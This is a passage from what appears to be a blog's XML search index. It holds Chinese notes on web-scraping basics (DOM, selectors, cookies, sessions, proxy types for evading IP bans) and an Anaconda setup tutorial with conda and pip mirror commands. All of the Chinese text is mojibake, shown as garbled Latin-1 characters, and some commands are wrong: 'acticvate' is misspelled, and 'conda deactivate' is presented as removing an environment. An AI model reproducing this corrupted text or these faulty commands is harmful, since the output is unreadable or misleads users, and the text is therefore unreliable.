‡å‡†ï¼ŒHTMLæ–‡æ¡£ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯èŠ‚ç‚¹ã€‚ æ•´ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªæ–‡æ¡£èŠ‚ç‚¹ã€‚ æ¯ä¸ªHTMLå…ƒç´ æ˜¯ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹ HTMLå…ƒç´ å†…çš„æ–‡æœ¬æ˜¯æ–‡æœ¬èŠ‚ç‚¹ã€‚ æ¯ä¸ªHTMLå±žæ€§æ˜¯å±žæ€§èŠ‚ç‚¹ã€‚ æ³¨é‡Šæ˜¯æ³¨é‡ŠèŠ‚ç‚¹ã€‚ é€šè¿‡HTML DOMï¼Œæ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹å‡å¯é€šè¿‡JavaScriptè®¿é—®ï¼Œæ‰€æœ‰HTMLèŠ‚ç‚¹å…ƒç´ å‡å¯è¢«ä¿®æ”¹,ä¹Ÿå¯ä»¥è¢«åˆ›ç«‹å’Œåˆ é™¤ã€‚èŠ‚ç‚¹æ ‘ä¸­çš„èŠ‚ç‚¹å½¼æ­¤æ‹¥æœ‰å±‚çº§å…³ç³»ï¼Œé€šå¸¸é€šè¿‡çˆ¶ï¼Œå­ï¼Œå…„å¼Ÿæ¥æè¿°è¿™äº›å…³ç³»ã€‚åœ¨èŠ‚ç‚¹æ ‘ä¸­ï¼Œé¡¶ç«¯èŠ‚ç‚¹é€šå¸¸ç§°ä¸ºæ ¹ é€‰æ‹©å™¨ï¼š åˆ†ä¸ºæ´¾ç”Ÿé€‰æ‹©å™¨ï¼Œé€šè¿‡ä¾æ®å…ƒç´ åœ¨å…¶ä½ç½®çš„ä¸Šä¸‹æ–‡å…³ç³»æ¥å®šä¹‰æ ·å¼ï¼Œæ´¾ç”Ÿé€‰æ‹©å™¨å…è®¸ä½ æ ¹æ®æ–‡æ¡£çš„ä¸Šä¸‹æ–‡å…³ç³»æ¥ç¡®å®šæŸä¸ªæ ‡ç­¾çš„æ ·å¼ã€‚é€šè¿‡åˆç†åœ°ä½¿ç”¨æ´¾ç”Ÿé€‰æ‹©å™¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ HTML ä»£ç å˜å¾—æ›´åŠ æ•´æ´ã€‚idé€‰æ‹©å™¨ï¼Œå¯ä»¥ä¸ºæ ‡æœ‰ç‰¹å®šidçš„HTMLå…ƒç´ æŒ‡å®šç‰¹å®šæ ·å¼ï¼Œä»¥ä¸€ä¸ª#å·è¡¨ç¤ºã€‚ç±»é€‰æ‹©å™¨ï¼Œä»¥ä¸€ä¸ªç‚¹å·è¡¨ç¤ºã€‚å±žæ€§é€‰æ‹©å™¨ï¼Œå¯ä»¥ä¸ºæ‹¥æœ‰æŒ‡å®šå±žæ€§çš„ HTML å…ƒç´ è®¾ç½®æ ·å¼ï¼Œè€Œä¸ä»…é™äºŽ class å’Œ id å±žæ€§ã€‚ çˆ¬è™«çš„åŸºæœ¬åŽŸç†ï¼šç®€å•æ¥è¯´ï¼Œçˆ¬è™«å°±æ˜¯èŽ·å–ç½‘é¡µå¹¶æå–å’Œä¿å­˜ä¿¡æ¯çš„è‡ªåŠ¨åŒ–ç¨‹åºã€‚ èŽ·å–ç½‘é¡µï¼šé¦–è¦å·¥ä½œä¾¿æ˜¯èŽ·å–ç½‘é¡µçš„æºä»£ç ï¼Œå› ä¸ºæºä»£ç åŒ…å«ç½‘é¡µçš„æ‰€æœ‰ä¿¡æ¯ã€‚å‘ç½‘ç«™å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œè¿”å›žçš„å“åº”ä½“ä¾¿æ˜¯ç½‘é¡µæºä»£ç ï¼Œæ‰€ä»¥æœ€å…³é”®çš„ä¾¿æ˜¯æž„é€ è¯·æ±‚ï¼Œç„¶åŽæŽ¥æ”¶åˆ°å“åº”å¹¶å°†å…¶è§£æžå‡ºæ¥ã€‚pythonæä¾›äº†è®¸å¤šåº“æ¥å®žçŽ°è¿™ä¸ªæ“ä½œï¼Œè¯·æ±‚å’Œå“åº”éƒ½å¯ä»¥ç”¨ç±»åº“æä¾›çš„æ•°æ®ç»“æž„è¡¨ç¤ºã€‚å¾—åˆ°å“åº”ä¹‹åŽæˆ‘ä»¬åªéœ€è¦è§£æžæ•°æ®ç»“æž„ä¸­çš„Bodyéƒ¨åˆ†å³å¯ã€‚ æå–ä¿¡æ¯ï¼šåˆ†æžç½‘é¡µæºä»£ç æœ€é€šç”¨çš„æ–¹å¼æ˜¯æ­£åˆ™è¡¨è¾¾å¼ã€‚è¿˜æœ‰ä¸€äº›æ ¹æ®ç½‘é¡µèŠ‚ç‚¹å±žæ€§ï¼ŒCSSé€‰æ‹©å™¨æˆ–è€…Xpathæå–ç½‘é¡µä¿¡æ¯çš„åº“ã€‚ ä¿å­˜æ•°æ®ï¼šå¯ä»¥ç®€å•ä¿å­˜ä¸ºtxt/jsonï¼Œæˆ–è€…ä¿å­˜åˆ°æ•°æ®åº“ï¼Œæˆ–è€…è¿œç¨‹æœåŠ¡å™¨ã€‚ è‡ªåŠ¨åŒ–ç¨‹åºï¼šåœ¨æŠ“å–è¿‡ç¨‹ä¸­è¿›è¡Œå„ç§å¼‚å¸¸å¤„ç†ï¼Œé”™è¯¯é‡è¯•ç­‰æ“ä½œã€‚ é™¤äº†ç½‘é¡µæºä»£ç ä¹‹å¤–ï¼Œè¿˜æœ‰äº›ç½‘é¡µè¿”å›žçš„ä¸æ˜¯HTMLä»£ç ï¼Œè€Œæ˜¯JSONå­—ç¬¦ä¸²ï¼ˆAPIæŽ¥å£å¤§å¤šå¦‚æ­¤ï¼‰ï¼Œè¿™æ ·çš„æ•°æ®æ–¹ä¾¿ä¼ è¾“ä¸Žè§£æžã€‚è¿˜æœ‰å„ç§äºŒè¿›åˆ¶æ•°æ®ï¼Œå¦‚å›¾ç‰‡éŸ³é¢‘ã€‚ä»¥åŠå„ç§æ‰©å±•åçš„æ–‡ä»¶ï¼Œåªè¦èƒ½åœ¨æµè§ˆå™¨è®¿é—®åˆ°éƒ½å¯ä»¥æŠ“å–ã€‚ JSæ¸²æŸ“é¡µé¢ï¼šæœ‰æ—¶å€™åœ¨urllibæˆ–è€…requestsæŠ“å–é¡µé¢æ—¶ï¼Œå¾—åˆ°çš„æºä»£ç ä¸Žå®žé™…çœ‹åˆ°çš„ä¸ä¸€æ ·ï¼Œè¿™æ˜¯å› ä¸ºçŽ°åœ¨ç½‘é¡µè¶Šæ¥è¶Šå¤šåœ°é‡‡ç”¨Ajaxï¼Œå‰ç«¯æ¨¡å—åŒ–å·¥å…·æž„å»ºï¼Œå¦‚æžœæ•´ä¸ªé¡µé¢éƒ½æ˜¯JSæ¸²æŸ“å‡ºæ¥çš„ï¼ˆåªè¦åœ¨æœ€åŽåŠ ä¸Šå³å¯å®Œæˆé¡µé¢æ¸²æŸ“(æ¸²æŸ“ï¼šæž„å»ºæ¸²æŸ“æ ‘ï¼Œå¯¹å„ä¸ªå…ƒç´ è¿›è¡Œä½ç½®è®¡ç®—ã€æ ·å¼è®¡ç®—ç­‰ç­‰ï¼Œç„¶åŽæ ¹æ®æ¸²æŸ“æ ‘å¯¹é¡µé¢è¿›è¡Œæ¸²æŸ“ï¼ˆå¯ä»¥ç†è§£ä¸ºâ€œç”»â€å…ƒç´ ï¼‰)ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªHTMLéª¨æž¶ã€‚ åœ¨æµè§ˆå™¨é‡Œæ‰“å¼€è¿™ä¸ªé¡µé¢æ—¶ï¼Œé¦–å…ˆåŠ è½½è¿™ä¸ªHTMLå†…å®¹ï¼Œç„¶åŽæµè§ˆå™¨ä¼šå‘çŽ°å…¶ä¸­å¼•å…¥äº†ä¸€ä¸ªapp.jsæ–‡ä»¶ï¼ŒæŽ¥ç€è¯·æ±‚è¿™ä¸ªæ–‡ä»¶ï¼ŒèŽ·å¾—è¯¥æ–‡ä»¶åŽæ‰§è¡Œå…¶ä¸­çš„JSä»£ç æ”¹å˜HTMLèŠ‚ç‚¹è¿›è¡Œæ¸²æŸ“ã€‚ä½†æ˜¯åœ¨ç”¨urllib/requestsæ—¶ä¸ä¼šå¸®æˆ‘ä»¬ç»§ç»­åŠ è½½è¿™ä¸ªJSæ–‡ä»¶ã€‚ å¯¹äºŽè¿™ç§æƒ…å†µï¼Œå¯ä»¥åˆ†æžå…¶åŽå°AjaxæŽ¥å£ï¼Œä¹Ÿå¯ä½¿ç”¨Selenium/Splashå®žçŽ°æ¨¡æ‹ŸJSæ¸²æŸ“ã€‚ ä¼šè¯å’ŒCookiesæœ€åŸºæœ¬çš„HTMLä»£ç ï¼Œå°†ä»–æ”¾åœ¨æŸå°å…·æœ‰å›ºå®šå…¬ç½‘IPçš„ä¸»æœºä¸Šï¼Œä¸»æœºä¸Šè£…ä¸ŠApache/NginxæœåŠ¡å™¨ï¼Œè¿™æ ·è¿™å°ä¸»æœºå°±å¯ä»¥ä½œä¸ºæœåŠ¡å™¨ï¼Œå»ºç«‹ä¸€ä¸ªç«™ç‚¹ã€‚è¿™åªæ˜¯ç®€å•çš„é™æ€ç½‘é¡µæ— æ³•å®žçŽ°äº¤äº’ã€‚ æ— çŠ¶æ€HTTPï¼šHTTPçš„æ— çŠ¶æ€æŒ‡HTTPåè®®å¯¹äº‹ç‰©å¤„ç†æ— è®°å¿†èƒ½åŠ›ã€‚å•çº¯çš„ä¸€æ¬¡HTTPè¯·æ±‚å®Œæˆè¿‡åŽï¼ŒæœåŠ¡å™¨ä¸ä¼šè®°å½•å‰åŽçŠ¶æ€çš„å˜åŒ–ï¼Œä¸çŸ¥é“å®¢æˆ·ç«¯çš„çŠ¶æ€ã€‚è¿™æ„å‘³ç€å¦‚æžœåŽç»­éœ€è¦å¤„ç†å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å¿…é¡»é‡ä¼ ã€‚ä¿æŒå‰åŽçŠ¶æ€ä¸€è‡´çš„æŠ€æœ¯å°±æ˜¯ä¼šè¯å’ŒCookiesã€‚ä¼šè¯ä½äºŽæœåŠ¡ç«¯ï¼Œå³ç½‘ç«™æœåŠ¡å™¨ï¼Œç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚Cookiesä½äºŽå®¢æˆ·ç«¯(æµè§ˆå™¨ç«¯)ï¼Œæœ‰äº†CookiesæœåŠ¡å™¨åœ¨ä¸‹æ¬¡è®¿é—®ç½‘é¡µæ—¶ä¼šè‡ªåŠ¨å°†å…¶é™„åŠ å‘é€ç»™æœåŠ¡å™¨ã€‚é‰´å®šå‡ºæ˜¯å“ªä¸ªç”¨æˆ·ï¼Œæ˜¯å¦ä¸ºç™»å½•çŠ¶æ€ï¼Œè¿”å›žå¯¹åº”çš„é¡µé¢ã€‚ å› æ­¤åœ¨çˆ¬è™«ä¸­ï¼Œå¤„ç†éœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„é¡µé¢æ—¶ï¼Œä¸€èˆ¬å°†ç™»å½•æˆåŠŸåŽèŽ·å–çš„Cookiesæ”¾åœ¨è¯·æ±‚å¤´é‡Œç›´æŽ¥è¯·æ±‚ã€‚ ä¼šè¯ï¼šä¼šè¯å¯¹è±¡ç”¨æ¥å­˜å‚¨ç‰¹å®šç”¨æˆ·ç»˜ç”»æ‰€éœ€çš„å±žæ€§ä»¥åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·å½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„webé¡µé¢ä¹‹é—´è·³è½¬çš„æ—¶å€™ï¼Œå­˜å‚¨åœ¨ä¼šè¯ä¹‹é—´çš„å˜é‡ä¸ä¼šæ¶ˆå¤±ï¼Œä¼šåœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€è‡´å­˜åœ¨ä¸‹åŽ»ã€‚ Cookiesï¼šç½‘ç«™ä¸ºäº†è¾¨è¯†ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡Œä¼šè¯è·Ÿè¸ªè€Œå­˜å‚¨åœ¨æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ã€‚ ä¼šè¯ç»´æŒï¼šå½“å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›žä¸€ä¸ªè¯·æ±‚å¤´é‡Œå¸¦æœ‰Set-Cookieå­—æ®µçš„å“åº”ç»™å®¢æˆ·ç«¯ï¼Œç”¨äºŽæ ‡è¯†ç”¨æˆ·ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨ä¼šæŠŠCookiesä¿å­˜èµ·æ¥ã€‚ä¸‹ä¸€æ¬¡ä¸€èµ·æäº¤ã€‚ å±žæ€§ç»“æž„ï¼šCookiesè¯¦è§£ å¼€å‘è€…å·¥å…·>Application>Storage>Cookies Nameï¼šè¯¥Cookiesçš„åç§°ï¼Œä¸€æ—¦åˆ›å»ºä¸å¯æ›´æ”¹ã€‚ Valueï¼šè¯¥Cookiesçš„å€¼ï¼Œå¦‚æžœä¸ºUnicodeåˆ™ä¸ºå­—ç¬¦ç¼–ç ã€‚å¦‚æžœä¸ºäºŒè¿›åˆ¶æ•°æ®BASE64ç¼–ç ã€‚ Domainï¼šå¯ä»¥è®¿é—®è¯¥Cookiesçš„åŸŸåï¼Œå¦‚æžœè®¾ç½®ä¸º.zhihu.comç»“å°¾çš„åŸŸåéƒ½å¯ä»¥è®¿é—®è¯¥Cookieã€‚ Max Ageï¼šè¯¥Cookieå¤±æ•ˆçš„æ—¶é—´ï¼Œå•ä½ä¸ºsï¼Œä¸ŽExpiresä¸€èµ·ä½¿ç”¨ã€‚ä¸ºæ­£æ•°åœ¨Max Ageç§’åŽå¤±æ•ˆï¼Œä¸ºè´Ÿæ•°å…³é—­æµè§ˆå™¨å³å¤±æ•ˆã€‚ Pathï¼šè¯¥Cookieçš„ä½¿ç”¨è·¯å¾„ï¼Œè®¾ç½®ä¸º/åˆ™è¯¥åŸŸåä¸‹æ‰€æœ‰é¡µé¢éƒ½å¯ä»¥è®¿é—®è¯¥Cookieã€‚ Sizeï¼šCookieå¤§å°ã€‚ HTTPå­—æ®µï¼šCookieçš„httponlyå±žæ€§ï¼Œå¦‚æžœä¸ºtrueåˆ™åªæœ‰åœ¨HTTPå¤´ä¸­ä¼šå¸¦æœ‰æ­¤Cookieä¿¡æ¯ï¼Œè€Œä¸èƒ½é€šè¿‡document.cookieæ¥è®¿é—®æ­¤Cookieã€‚ Secureï¼šè¯¥Cookieæ˜¯å¦ä»…è¢«ä½¿ç”¨å®‰å…¨åè®®ä¼ è¾“ã€‚å®‰å…¨åè®®ï¼šSSLï¼ŒHTTPSã€‚ ä¼šè¯Cookieä¸ŽæŒä¹…Cookieï¼Œå‰è€…æŠŠCookieæ”¾åœ¨æµè§ˆå™¨å†…å­˜é‡Œï¼ŒåŽè€…æŠŠCookieå­˜æ”¾åˆ°å®¢æˆ·ç«¯ç¡¬ç›˜ä¸­ã€‚(ä¸¥æ ¼æ„ä¹‰æ¥è¯´åªæ˜¯Max Ageçš„å¤§å°é—®é¢˜ã€‚)é™¤éžç¨‹åºé€šçŸ¥æœåŠ¡å™¨åˆ é™¤ä¸€ä¸ªä¼šè¯ï¼Œå¦åˆ™æœåŠ¡å™¨ä¼šä¸€ç›´ä¿ç•™ã€‚è¿™å°±éœ€è¦æœåŠ¡å™¨ä¸ºä¼šè¯è®¾ç½®ä¸€ä¸ªå¤±æ•ˆæ—¶é—´ã€‚ ä»£ç†çš„åŸºæœ¬åŽŸç†ï¼š403 Forbidden>IP è®¿é—®é¢‘çŽ‡å¤ªé«˜>åçˆ¬è™«æŽªæ–½>ä½¿ç”¨ä»£ç† åŸºæœ¬åŽŸç†ï¼šproxy serverï¼Œä»£ç†ç½‘ç»œç”¨æˆ·åŽ»å–å¾—ç½‘ç»œä¿¡æ¯ï¼Œé€šè¿‡ä¸­è½¬ç«™ä¼ é€’å‘æœåŠ¡å™¨çš„è¯·æ±‚ä¸Žå“åº”ï¼Œè¿™æ ·æœåŠ¡å™¨è¯†åˆ«å‡ºçš„IPå°±ä¸å†æ˜¯æœ¬æœºIPã€‚ ä»£ç†ä½œç”¨: çªç ´è‡ªèº«IPè®¿é—®é™åˆ¶ï¼Œè®¿é—®ä¸èƒ½è®¿é—®çš„ç«™ç‚¹ã€‚ è®¿é—®å†…ç½‘ä¸­çš„èµ„æºã€‚ æé«˜è®¿é—®é€Ÿåº¦ï¼šé€šå¸¸ä»£ç†æœåŠ¡å™¨éƒ½è®¾ç½®ä¸€ä¸ªè¾ƒå¤§çš„ç¡¬ç›˜ç¼“å†²åŒºï¼Œå¤–ç•Œä¿¡æ¯é€šè¿‡æ—¶ä¼šè¢«ä¿ç•™åœ¨ç¼“å†²åŒºï¼Œåˆ«çš„ç”¨æˆ·è®¿é—®ç›¸åŒä¿¡æ¯åˆ™ç›´æŽ¥ä»Žç¼“å†²åŒºå–ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚ éšè—çœŸå®žIPï¼Œå…å—æ”»å‡»ã€‚ ä»£ç†åˆ†ç±»ï¼šæ ¹æ®åè®®åŒºåˆ†/æ ¹æ®åŒ¿åç¨‹åº¦åŒºåˆ†ï¼š FTPä»£ç†æœåŠ¡å™¨ï¼šç”¨äºŽè®¿é—®FTPæœåŠ¡å™¨ï¼Œä¸€èˆ¬æœ‰ä¸Šä¼ ï¼Œä¸‹è½½ï¼Œç¼“å­˜åŠŸèƒ½ï¼Œportï¼š21ï¼Œ2121ã€‚ HTTPä»£ç†æœåŠ¡å™¨ï¼šä¸»è¦ç”¨äºŽè®¿é—®ç½‘é¡µï¼Œä¸€èˆ¬æœ‰å†…å®¹è¿‡æ»¤ä¸Žç¼“å­˜åŠŸèƒ½ï¼Œportï¼š80ï¼Œ8080ï¼Œ3128ã€‚ SSL/TLSä»£ç†ï¼šè®¿é—®åŠ å¯†ç½‘ç«™ï¼Œä¸€èˆ¬æœ‰SSL/TLSåŠ å¯†åŠŸèƒ½ï¼Œportï¼š443ã€‚ RTSPä»£ç†ï¼šè®¿é—®Realæµåª’ä½“æœåŠ¡å™¨ï¼Œç¼“å­˜åŠŸèƒ½ï¼Œportï¼š554. Telnetä»£ç†ï¼štelnetè¿œç¨‹æŽ§åˆ¶ï¼ˆé»‘å®¢å…¥ä¾µè®¡ç®—æœºæ—¶å¸¸ç”¨äºŽéšè—èº«ä»½ï¼Ÿï¼‰ï¼Œportï¼š23ã€‚ POP3/SMTPä»£ç†ï¼šä¸»è¦ç”¨äºŽPOP3/SMTPæ–¹å¼æ”¶å‘é‚®ä»¶ï¼Œç¼“å­˜ï¼Œportï¼š110ï¼Œ25. SOCKSä»£ç†ï¼šå•çº¯ä¼ é€’æ•°æ®åŒ…ï¼Œä¸å…³ç³»å…·ä½“åè®®ä¸Žç”¨æ³•ï¼Œé€Ÿåº¦å¿«å¾ˆå¤šï¼Œç¼“å­˜ï¼Œportï¼š1080.åˆ†ä¸ºSOCKS4å’ŒSOCKS5ï¼Œå‰è€…æ”¯æŒTCPï¼ŒåŽè€…æ”¯æŒTCPä¸ŽUDPï¼Œè¿˜æ”¯æŒå„ç§èº«ä»½éªŒè¯æœºåˆ¶ï¼ŒæœåŠ¡å™¨åŸŸåè§£æžç­‰ï¼Œå­é›†å…³ç³»ã€‚ é«˜åº¦åŒ¿åä»£ç†ï¼šæ•°æ®åŒ…åŽŸå°ä¸åŠ¨è½¬å‘ï¼ŒæœåŠ¡ç«¯çœ‹èµ·æ¥å°±æ˜¯æ™®é€šç”¨æˆ·ï¼ŒIPä¸ºä»£ç†æœåŠ¡å™¨IPã€‚ æ™®é€šåŒ¿åä»£ç†ï¼šä¼šåœ¨æ•°æ®åŒ…ä¸Šåšä¸€äº›æ”¹åŠ¨ï¼ŒæœåŠ¡ç«¯æœ‰å¯èƒ½å¯Ÿè§‰æ˜¯ä»£ç†æœåŠ¡å™¨ï¼Œå¯èƒ½è¿½æŸ¥åˆ°å®¢æˆ·ç«¯IPã€‚ä»£ç†æœåŠ¡å™¨é€šå¸¸åŠ å…¥çš„HTTPå¤´åˆHTTP-VIAå’ŒHTTP-X-FORWARD-FORã€‚ é€æ˜Žä»£ç†ï¼šä¸ä½†æ”¹åŠ¨æ•°æ®åŒ…ï¼Œè¿˜å‘Šè¯‰å®¢æˆ·ç«¯çœŸæ˜¯IPã€‚é™¤äº†èƒ½ç”¨ç¼“å­˜æŠ€æœ¯æé«˜æµè§ˆé€Ÿåº¦ï¼Œèƒ½ç”¨å†…å®¹è¿‡æ»¤æé«˜å®‰å…¨æ€§ï¼Œæ— å…¶ä»– æ˜¾è‘—ä½œç”¨ï¼Œå¦‚å†…ç½‘ä¸­çš„ç¡¬ä»¶é˜²ç«å¢™ã€‚ å¸¸è§ä»£ç†è®¾ç½®ï¼šä½¿ç”¨ç½‘ä¸Šå…è´¹ä»£ç†ï¼šæœ€å¥½ä½¿ç”¨é«˜åŒ¿ä»£ç†ã€‚ ä½¿ç”¨ä»˜è´¹ä»£ç†ï¼šç½‘ç»œä¸Šè®¸å¤šä»£ç†å•†ã€‚ ADSLæ‹¨å·ï¼šæ‹¨ä¸€æ¬¡å·æ¢ä¸€æ¬¡IPï¼Œç¨³å®šæ€§é«˜ã€‚]]></content>
      <tags>
        <tag>python3ç½‘ç»œçˆ¬è™«å¼€å‘å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Anacondaæ•™ç¨‹]]></title>
    <url>%2F2020%2F03%2F16%2FAnaconda%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[AnacondaæŒ‡çš„æ˜¯ä¸€ä¸ªå¼€æºçš„Pythonå‘è¡Œç‰ˆæœ¬ï¼Œå…¶åŒ…å«äº†Pythonã€condaç­‰180å¤šä¸ªç§‘å­¦åŒ…åŠå…¶ä¾èµ–é¡¹ã€‚ å› ä¸ºåŒ…å«äº†å¤§é‡çš„ç§‘å­¦åŒ…ï¼ŒAnaconda çš„ä¸‹è½½æ–‡ä»¶æ¯”è¾ƒå¤§ã€‚Anacondaå¯¹äºŽpythonåˆå­¦è€…è€Œè¨€åŠå…¶å‹å¥½ï¼Œç›¸æ¯”å•ç‹¬å®‰è£…pythonä¸»ç¨‹åºï¼Œé€‰æ‹©Anacondaå¯ä»¥å¸®åŠ©çœåŽ»å¾ˆå¤šéº»çƒ¦ï¼ŒAnacondaé‡Œæ·»åŠ äº†è®¸å¤šå¸¸ç”¨çš„åŠŸèƒ½åŒ…ï¼Œå¦‚æžœå•ç‹¬å®‰è£…pythonï¼Œè¿™äº›åŠŸèƒ½åŒ…åˆ™éœ€è¦ä¸€æ¡ä¸€æ¡è‡ªè¡Œå®‰è£…ï¼Œåœ¨Anacondaä¸­åˆ™ä¸éœ€è¦è€ƒè™‘è¿™äº›ï¼ŒåŒæ—¶Anacondaè¿˜é™„å¸¦æ†ç»‘äº†ä¸¤ä¸ªéžå¸¸å¥½ç”¨çš„äº¤äº’å¼ä»£ç ç¼–è¾‘å™¨ï¼ˆSpyderã€Jupyter notebookï¼‰ã€‚ 1.å®‰è£…ä»€ä¹ˆçš„å°±ç•¥è¿‡ï¼Œæ²¡ä»€ä¹ˆå¤§é—®é¢˜ã€‚ 2.å®‰è£…å®ŒåŽç”¨ä¸‹é¢çš„å‘½ä»¤æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸä»¥åŠå‡çº§ä»¥åŠå®‰è£…çš„åº“ 12conda --versionconda upgrade --all 3.æœ€å¥½æ¢ä¸Šå›½å†…çš„é•œåƒæºï¼Œå¦‚æ¸…åŽçš„ï¼š 1234conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/conda config --set show_channel_urls yes åœ¨anaconda promptä¸­æ‰§è¡Œï¼Œå¹¶ä¸”åˆ åŽ»C:\User\Lenovo.condarcä¸­çš„ 1- defaults æŸ¥çœ‹é…ç½®çš„å‘½ä»¤ï¼š 1conda config --show 4.ç¢°ä¸Šæ¸…åŽçš„é•œåƒæºä¹Ÿä¸å¤ªå¥½ç”¨ï¼Œæžäº†å¾ˆä¹…ä¸€ç›´æŠ¥é”™ï¼š 123456CondaHTTPError: HTTP 000 CONNECTION FAILED for url &lt;https://conda.anaconda.org/conda-forge/win-64/repodata.json&gt;Elapsed: -An HTTP error occurred when trying to retrieve this URL.HTTP errors are often intermittent, and a simple retry will get you on your way.&apos;https://conda.anaconda.org/conda-forge/win-64&apos; æœ€åŽé‡å¯å±…ç„¶å¥½äº†ï¼ŒçŽ„å­¦ï¼Œåº”è¯¥æ˜¯æŸäº›é…ç½®éœ€è¦é‡å¯ç”Ÿæ•ˆå§ã€‚ 5.å®‰è£…scrapyçš„æ—¶å€™å‘çŽ°è¿˜æ˜¯ä¸è¡Œï¼Œå¾—ï¼Œç»§ç»­è‚å§ã€‚ 6.å‡çº§Anaconda 1conda update conda 7.AnacondaçŽ¯å¢ƒç®¡ç† 1conda info â€“envs åˆ—å‡ºæ‰€æœ‰çš„çŽ¯å¢ƒ 8.åˆ›å»ºä¸€ä¸ªçŽ¯å¢ƒ 1conda create -n env_name python=2.7 9.é•œåƒæºä¸æ˜¯åŠ çš„è¶Šå¤šè¶Šå¥½,ä¸€ä¸ªä¸€ä¸ªè¯•è¯•æœ€å¥½ã€‚ 10. 1[WinError 193] %1 ä¸æ˜¯æœ‰æ•ˆçš„ Win32 åº”ç”¨ç¨‹åºã€‚ è¿™ä¸ªæŠ¥é”™äº§ç”Ÿçš„åŽŸå› æ˜¯pythonä½æ•°å’Œdllä½æ•°ä¸ä¸€æ ·ï¼Œdllæ˜¯32ä½ï¼Œè€Œpythonæ˜¯64ä½ã€‚ï¼ˆè¿˜æ˜¯ç¬¬ä¸€æ¬¡çŸ¥é“pythonä¹Ÿæœ‰64ä½32ä½ä¹‹åˆ†ï¼‰ã€‚ è§£å†³åŠžæ³•ï¼š 1.å®‰è£…64ä½çš„dll(ä¸€èˆ¬å¾ˆéš¾æ‰¾åˆ°)ã€‚ 2.å®‰è£…32ä½çš„pythonï¼ŒåŒæ—¶ç”¨anacondaä¿è¯64ä½çš„ä¸Ž32ä½çš„å…±å­˜ã€‚ å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š 12set CONDA_FORCE_32BIT=1æ˜¯åˆ‡æ¢åˆ°32ä½ï¼Œset CONDA_FORCE_32BIT=æ˜¯åˆ‡æ¢åˆ°64ä½ã€‚//è¿™æ ·åˆ‡æ¢çŽ¯å¢ƒå¯¹å·²ç»å®‰è£…çš„pythonæ²¡æœ‰ä»»ä½•å½±å“ï¼ŒåŽŸæ¥æ˜¯64ä½çš„pythonè¿˜æ˜¯64ä½ï¼Œæ‰€ä»¥éœ€è¦åˆ‡æ¢åˆ°32ä½ä»¥åŽåˆ›å»ºä¸ªè™šæ‹ŸçŽ¯å¢ƒå®‰è£…pythonã€‚å¹¶ä¸”å®‰è£…éœ€è¦åœ¨promptä¸‹è¿›è¡Œï¼Œåœ¨navigatorä¸­é»˜è®¤pythonæ˜¯64ä½çš„ã€‚ è®²é“ç†æˆ‘è§‰å¾—scrapyä½œä¸ºè¿™ä¹ˆè‘—åçš„æ¡†æž¶ï¼Œåº”è¯¥ä¸ä¼šå‡ºçŽ°è¿™ç§é—®é¢˜å§ã€‚ 11.åˆ‡æ¢è™šæ‹ŸçŽ¯å¢ƒ 1conda acticvate env_name,conda deactivate env_name 12.ç§»é™¤çŽ¯å¢ƒï¼š 1conda deactivate env_name 13.æŸ¥çœ‹å½“å‰ä»£ç†ä¼˜å…ˆçº§ï¼š 1conda config --get channels 14.ä¸ŽPycharmè¿žæŽ¥ åœ¨å·¥ä½œçŽ¯å¢ƒä¸­æˆ‘ä»¬ä¼šé›†æˆå¼€å‘çŽ¯å¢ƒåŽ»ç¼–ç , è¿™é‡ŒæŽ¨èJBå…¬å¸çš„PyCharm, è€ŒPyCharmä¹Ÿèƒ½å¾ˆæ–¹ä¾¿çš„å’Œanacondaçš„è™šæ‹ŸçŽ¯å¢ƒç»“åˆ åœ¨Setting =&gt; Project =&gt; Project Interpreter é‡Œé¢ä¿®æ”¹ Project Interpreter , ç‚¹å‡»é½¿è½®æ ‡å¿—å†ç‚¹å‡»Add Localä¸ºä½ æŸä¸ªçŽ¯å¢ƒçš„python.exeè§£é‡Šå™¨å°±è¡Œäº† 15.é•¿æœŸæ›´æ¢pipé•œåƒæº -i é˜¿é‡Œäº‘ https://mirrors.aliyun.com/pypi/simple/ ç”µå­ç§‘æŠ€å¤§å­¦ https://pypi.mirrors.ustc.edu.cn/simple/ è±†ç“£(douban) http://pypi.douban.com/simple/ æ¸…åŽå¤§å­¦ https://pypi.tuna.tsinghua.edu.cn/simple/ ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ http://pypi.mirrors.ustc.edu.cn/simple/ä¿®æ”¹æºæ–¹æ³•ï¼š ä¸´æ—¶ä½¿ç”¨ï¼šå¯ä»¥åœ¨ä½¿ç”¨pipçš„æ—¶å€™åœ¨åŽé¢åŠ ä¸Š-iå‚æ•°ï¼ŒæŒ‡å®špipæºeg: pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple æ°¸ä¹…ä¿®æ”¹ï¼šlinux:ä¿®æ”¹ ~/.pip/pip.conf 